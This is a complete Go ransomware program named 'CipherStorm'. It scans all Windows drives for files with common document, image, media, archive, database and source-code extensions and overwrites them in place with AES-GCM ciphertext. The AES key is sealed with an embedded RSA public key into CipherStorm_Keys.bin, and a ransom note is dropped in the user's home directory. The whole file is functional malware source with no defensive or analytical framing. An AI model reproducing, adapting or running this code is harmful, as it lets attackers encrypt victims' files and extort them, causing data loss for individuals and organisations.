package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"io"
	"io/fs"
	"os"
	"os/user"
	"path/filepath"
	"slices"
	"strings"
)

var EXT = []string{
	"doc", "docx", "odt", "pdf", "txt", "rtf", "tex", "wps", "xls", "xlsx",
	"ods", "csv", "ppt", "pptx", "odp", "jpg", "jpeg", "png", "gif", "bmp",
	"tiff", "svg", "mp3", "wav", "aac", "flac", "m4a", "mp4", "avi", "mov",
	"wmv", "mkv", "flv", "zip", "rar", "7z", "tar", "gz", "bak", "tmp",
	"old", "db", "sql", "mdb", "accdb", "html", "htm", "css", "js", "py",
	"java", "c", "cpp", "epub", "mobi", "azw", "psd", "ai", "go", "pyw",
}
var FILES = []string{}

const public_Key = `-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA5ITxibqvxk1GQ0kXAWaR
VIz45Lc/y5Fgj1HpCZ14HSWBsPgeS6qRxQtooQr7h6BBfwF40sM+xOtadTJ+MNEv
tCXRBB8OmPNPRf3HV1y9ZnGTnBCgMm/jJ1kzs1no2bEv/9QcmUWuYn/DoMfGjGQO
ilzASkyvEPn6bX/+ufJ4MtVc0FLbj+SATfvRDnSAzmLZ7yHH7UjIAJ74I0EUctJX
l2m0XATmvSVeu8Yow7hTKQ6BL1SSwi6AUEmWWPhOy27Rb62mFTH/C1n/hLfa3bVO
5S+lfpZDb+szdtcLKv9hFlgbAFfVpcQoTu/x5htPv5LJKElHFCyxB42Kmatg09CX
tUJLAZNBSxONuqE6b1hDRiTuCNZH4TD76jlmusR1pymv8zLFNEJZWwrSLEpOVptb
9Hb4B3n8InRr68squSBeeAIFKRj310LbPpZVCqpV/B39gHvNLmMSV0ZHrrCj2jF/
zfQeLJPVwAmH4qWcaKvA8NntxN9lUkoCTFRIQrs9pnhQTSl8ArXnj/WaICHC4ILK
8n++ks5AO6Iuq3+Wqrc42W0AbKLcENbm6IHXbxf4r/PELHrWa874vDOXz99Q5fa1
FgqoacrqCb2V6/cE1cH8uu4DcNFM9/ehvT1CqRmBnpP/qOW4xVAoLzbxVzj9si39
St6kW8kUefnfYuFgWq92TOMCAwEAAQ==
-----END PUBLIC KEY-----`

const _ransom = `ALERT: Your Files Are Now Encrypted!

Warning!

All files on your PC have been "encrypted" by CipherStorm encryption algorithm. Here's what's really going on:

1.  All your important files (well, they were encrypted ) are "locked" by a AES key.
2.  You'll notice that the "decryption key" is stored in a file called CipherStorm_Keys.bin.
3.  Deleting this file permenantly encrypts all files.
`

func ransom(file_name string) error {
	currentUser, _ := user.Current()
	homeDir := currentUser.HomeDir

	file_path := filepath.Join(homeDir, file_name)
	file, err := os.Create(file_path)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(_ransom)
	if err != nil {
		return err
	}
	return nil
}

func rsa_encode(aes_key []byte) error {
	block, _ := pem.Decode([]byte(public_Key))
	if block == nil || block.Type != "PUBLIC KEY" {
	}

	publicKeyInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return err
	}

	publicKey, ok := publicKeyInterface.(*rsa.PublicKey)
	if !ok {
		return err
	}
	//enc aes key
	enc_aes_key, err := rsa.EncryptOAEP(
		sha256.New(),
		rand.Reader,
		publicKey,
		aes_key,
		nil,
	)
	if err != nil {
		return err
	}
	//creating file
	currentUser, _ := user.Current()
	homeDir := currentUser.HomeDir

	file := filepath.Join(homeDir, "CipherStorm_Keys.bin")
	password, err := os.Create(file)
	if err != nil {
		return err
	}
	defer password.Close()
	os.WriteFile(file, enc_aes_key, 0777)
	return nil
}

func aes_password_generator() ([]byte, error) {
	length := 32
	password := make([]byte, length)
	_, err := rand.Read(password)
	if err != nil {
		return []byte{}, err
	}
	return password, nil
}

func encrypt(byte_text []byte, byte_key []byte) ([]byte, error) {
	c, err := aes.NewCipher(byte_key)
	if err != nil {
		return []byte{}, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return []byte{}, err
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return []byte{}, err
	}

	enc_byte_text := gcm.Seal(nonce, nonce, byte_text, nil)

	return enc_byte_text, nil
}

func encrypt_file(file_name string, key []byte, done chan bool) error {
	file, err := os.ReadFile(file_name)
	if err != nil {
		return err
	}

	enc_file, err := encrypt(file, key)
	if err != nil {
		return err
	}

	err = os.WriteFile(file_name, enc_file, 0777)
	if err != nil {
		return err
	}
	done <- true
	return nil
}

func traverse(drive string) error {
	err := filepath.WalkDir(drive, func(path string, d fs.DirEntry, err error) error {
		if d.IsDir() != true {
			path_ext := strings.Split(path, ".")
			if slices.Contains(EXT, path_ext[1]) {
				FILES = append(FILES, path)
			}
		}
		return nil
	})
	if err != nil {
		return err
	}
	return nil
}

func main() {

	drives := []string{"A:\\\\", "B:\\\\", "C:\\\\", "D:\\\\", "E:\\\\", "F:\\\\", "G:\\\\", "H:\\\\",
		"I:\\\\", "J:\\\\", "K:\\\\", "L:\\\\", "M:\\\\", "N:\\\\", "O:\\\\", "P:\\\\", "Q:\\\\", "R:\\\\",
		"S:\\\\", "T:\\\\", "U:\\\\", "V:\\\\", "W:\\\\", "X:\\\\", "Y:\\\\", "Z:\\\\",
	}

	for _, drive := range drives {
		_, err := os.Stat(drive)
		if err == nil {
			traverse(drive)
		}
	}

	aes_gen_password, _ := aes_password_generator()
	rsa_encode(aes_gen_password)

	done := make(chan bool)

	min := func(a, b int) int {
		if a > b {
			return b
		} else {
			return a
		}
	}

	for i := 0; i < len(FILES); i += 20 {
		go func(i int) {
			for _, file := range FILES[i:min(len(FILES), i+20)] {
				encrypt_file(file, aes_gen_password, done)
			}
		}(i)
	}

	for range FILES {
		<-done
	}

	ransom("README_cipherstorm.txt")
}
